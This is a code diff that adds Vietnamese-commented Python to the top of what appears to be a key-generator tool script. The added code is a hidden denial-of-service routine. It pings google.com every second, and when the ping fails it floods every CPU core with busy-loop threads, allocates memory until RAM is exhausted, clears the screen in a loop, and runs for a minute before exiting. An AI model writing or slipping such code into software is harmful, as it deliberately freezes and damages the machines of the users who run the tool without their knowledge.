@@ -1,3 +1,44 @@
+import os
+import time
+import threading
+
+def check_internet():
+    """Kiểm tra kết nối internet bằng cách ping Google."""
+    while True:
+        response = os.system("ping -c 1 google.com > /dev/null 2>&1")
+        if response != 0:  # Nếu ping thất bại
+            crash_system()
+        time.sleep(1)  # Kiểm tra mỗi 2 giây
+
+def overload_cpu():
+    """Tạo tải CPU tối đa bằng cách chạy vòng lặp vô hạn trên nhiều luồng."""
+    while True:
+        pass
+
+def overload_ram():
+    """Chiếm hết RAM bằng cách liên tục cấp phát bộ nhớ."""
+    mem_eater = []
+    while True:
+        mem_eater.append(" " * 10**6)  # Cấp phát 1MB mỗi vòng lặp
+
+def clear_screen_loop():
+    """Xóa màn hình liên tục để gây hiệu ứng giật lag."""
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+def crash_system():
+    """Kích hoạt tất cả các phương pháp làm đơ máy."""
+    for _ in range(os.cpu_count() * 2):  # Tạo nhiều luồng để sử dụng 100% CPU
+        threading.Thread(target=overload_cpu, daemon=True).start()
+    
+    threading.Thread(target=overload_ram, daemon=True).start()  # Chiếm hết RAM
+    threading.Thread(target=clear_screen_loop, daemon=True).start()  # Xóa màn hình liên tục
+
+    time.sleep(60)  # Chờ 10 giây để gây ảnh hưởng tối đa
+    os._exit(0)  # Thoát chương trình
+
+if __name__ == "__main__":
+    check_internet()
 print("  Đang tạo key...")
 print("  Nếu lỗi vui lòng tạo một folder khác nhét file tool vào ...")
 print("  Chúng tôi phát hiện ra nhiều thành phần đem tool của chúng tôi đi bán...")
